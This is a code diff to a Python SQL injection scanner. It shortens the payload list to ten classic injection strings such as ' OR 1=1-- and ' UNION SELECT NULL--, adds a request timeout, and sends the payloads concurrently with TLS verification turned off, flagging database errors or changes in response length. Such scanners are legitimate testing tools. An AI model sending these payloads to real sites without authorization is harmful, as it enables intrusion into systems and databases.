@@ -1,17 +1,25 @@
 import requests
 import urllib3
 from urllib.parse import urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Suppress InsecureRequestWarning from urllib3 when using verify=False
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+REQUEST_TIMEOUT = 5  # seconds per payload request
+
+# Top 10 most effective SQLi payloads — optimized for speed
 SQL_PAYLOADS = [
-    "'", "''", '"', "'--", "'#", "'/*", "' OR '1'='1", "' OR '1'='2", "' OR 1=1", "' OR 1=2",
-    '" OR "1"="1', "' AND 1=1", "' AND 1=2", "' OR 'a'='a", "' OR 'a'='b", "' OR 1=1--",
-    "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 LIMIT 1", "' UNION SELECT NULL", "' UNION SELECT 1",
-    "' UNION SELECT 1,2", "' UNION SELECT 1,2,3", "' UNION SELECT NULL,NULL",
-    "' UNION SELECT NULL,NULL,NULL", "admin' --", "admin' #", "' OR sleep(5)--",
-    "' OR benchmark(1000000,md5(1))", "' OR 1=1 AND 'a'='a"
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    '" OR "1"="1',
+    "' UNION SELECT NULL--",
+    "' AND 1=2--",
+    "admin' --",
+    "' OR 1=1#",
+    "1' ORDER BY 1--",
+    "' OR 'a'='a",
 ]
 
 SQL_ERRORS = [
@@ -50,7 +58,7 @@ def run_sqli_scan(url):
 
     try:
         logs.append("[INFO] Fetching original baseline response...")
-        original = requests.get(url, timeout=10, verify=False).text
+        original = requests.get(url, timeout=REQUEST_TIMEOUT, verify=False).text
     except Exception as e:
         logs.append(f"[ERROR] Target unreachable: {str(e)}")
         return {
@@ -60,30 +68,35 @@ def run_sqli_scan(url):
             "details": logs
         }
 
-    for payload in SQL_PAYLOADS:
+    def test_payload(payload):
+        """Test a single payload and return result tuple."""
         injected_url = inject_payload(url, payload)
         if not injected_url:
-            continue
-            
-        logs.append(f"[SCANNING] Testing payload: {payload}")
-        logs.append(f"[URL] {injected_url}")
-
+            return None
         try:
-            r = requests.get(injected_url, timeout=10, verify=False)
+            r = requests.get(injected_url, timeout=REQUEST_TIMEOUT, verify=False)
             error_detected = check_sql_error(r.text)
             length_changed = check_response_length(original, r.text)
+            return {
+                "payload": payload,
+                "url": injected_url,
+                "vulnerable": error_detected or length_changed
+            }
+        except Exception:
+            return None
 
-            if error_detected or length_changed:
-                findings.append({
-                    "payload": payload,
-                    "url": injected_url
-                })
-                logs.append(f"[WARNING] Potential vulnerability detected with payload: {payload}")
-                # We can stop early if we find one, or continue. For a thorough scan, we continue.
-                # But for MVP, finding one is enough. Let's break to speed it up.
-                break
-        except:
-            continue
+    # Run all payloads concurrently for speed
+    logs.append(f"[INFO] Testing {len(SQL_PAYLOADS)} payloads concurrently...")
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(test_payload, p): p for p in SQL_PAYLOADS}
+        for future in as_completed(futures):
+            result = future.result()
+            if result is None:
+                continue
+            logs.append(f"[SCANNING] Tested: {result['payload']}")
+            if result["vulnerable"]:
+                findings.append({"payload": result["payload"], "url": result["url"]})
+                logs.append(f"[WARNING] Vulnerability detected with: {result['payload']}")
 
     if findings:
         logs.append("[SUCCESS] Analysis complete. Vulnerabilities found!")
